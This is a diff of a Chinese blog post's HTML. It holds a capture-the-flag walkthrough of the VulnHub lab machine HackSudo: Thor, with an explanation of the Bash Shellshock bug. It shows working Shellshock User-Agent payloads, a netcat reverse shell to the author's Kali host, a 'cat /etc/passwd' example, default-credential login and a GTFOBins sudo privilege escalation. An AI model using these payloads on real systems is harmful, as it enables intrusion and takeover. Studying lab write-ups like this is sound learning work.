@@ -13,31 +13,6 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="该靶机难度为中等，主要是破壳漏洞为第一次遇到，有点没底。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png">
 <meta property="article:published_time" content="2022-04-11T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-04-27T03:42:18.731Z">
 <meta property="article:author" content="hdfzzf">
@@ -47,7 +22,6 @@
 <meta property="article:tag" content="开源源码泄露">
 <meta property="article:tag" content="GTFOBins提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png">
     
     
       
@@ -130,7 +104,8 @@
     </span>
     <br/>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface 基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface
+基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -182,7 +157,9 @@
     <p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
 <span id="more"></span>
 <h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
+<p>靶机地址：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo:
+Thor</a></p>
 <p>难度：中</p>
 <p>目标：取得root权限 + 2 Flag</p>
 <p>涉及攻击方法：</p>
@@ -195,10 +172,12 @@
 <li><strong>破壳漏洞</strong></li>
 <li><strong>GTFOBins提权</strong></li>
 </ul>
-<h1 id="common-gateway-interface-基础">Common Gateway Interface 基础</h1>
+<h1 id="common-gateway-interface-基础">Common Gateway Interface
+基础</h1>
 <p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
 <p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
 <p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
 <p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
 <center>
@@ -216,51 +195,71 @@
 <p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
 <h1 id="破壳漏洞">破壳漏洞</h1>
 <h2 id="概述">概述</h2>
-<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
+<p>Bash
+4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
 <h2 id="前置技术">前置技术</h2>
 <p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
 <h3 id="bash基础">bash基础</h3>
 <p>在bash中，可以自定义变量，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
 <p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
 <p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
 <p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
 <p>将函数导入全局变量之后</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
-<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
+<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a
+target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
 <h2 id="影响的版本">影响的版本</h2>
 <p>bash version &lt;= 4.3</p>
 <h2 id="漏洞复现">漏洞复现</h2>
-<p><a target="_blank" rel="noopener" href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash
+Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
 <h2 id="利用分析">利用分析</h2>
 <p><strong>漏洞原理</strong>：</p>
 <p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
 <p><strong>接下来才是漏洞产生的重点：</strong></p>
 <p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
 <p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
 <p>并且此时<code>func</code>也会被当作函数执行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
 <p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
-<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
-<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
+<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3）
+2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
+<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如
+User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改
+User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
-<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
+<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！
+中间那个<code>echo</code>
+不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
 </blockquote>
 <h2 id="利用场景">利用场景</h2>
 <ul>
 <li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
-<li><p>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</p></li>
+<li><p>环境变量的赋值字符串来源于用户输入 ,
+且没有通过有效的过滤</p></li>
 </ul>
 <h1 id="渗透">渗透</h1>
 <p>kali：10.0.2.4</p>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<h2
+id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
 <ul>
 <li>21端口的服务为ftp</li>
 <li>22端口的服务为ssh</li>
@@ -270,8 +269,10 @@
 <h2 id="访问http服务">访问http服务</h2>
 <p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
 <p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
-<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
+<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址
+https://github.com/zakee94/online-banking-system</p>
 <p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
 <p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
 <p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
@@ -279,41 +280,58 @@
 <h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
 <p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
 <p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
 <p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
 <p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
 <p>反弹成功！</p>
 <h2 id="权限提升">权限提升</h2>
 <p>首先查看一下sudo配置<code>sudo -l</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
 <p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
 <p>然后要求我们输入，我们输入几条系统命令看一下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
 <p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
 <p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
 <p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
-<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a target="_blank" rel="noopener" href="https://gtfobins.github.io">gtfobins</a></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
+<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a
+target="_blank" rel="noopener" href="https://gtfobins.github.io">gtfobins</a></p>
 <p>网站中提到</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
-<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
+<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令：
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
 <p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
 <p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
+<p><img
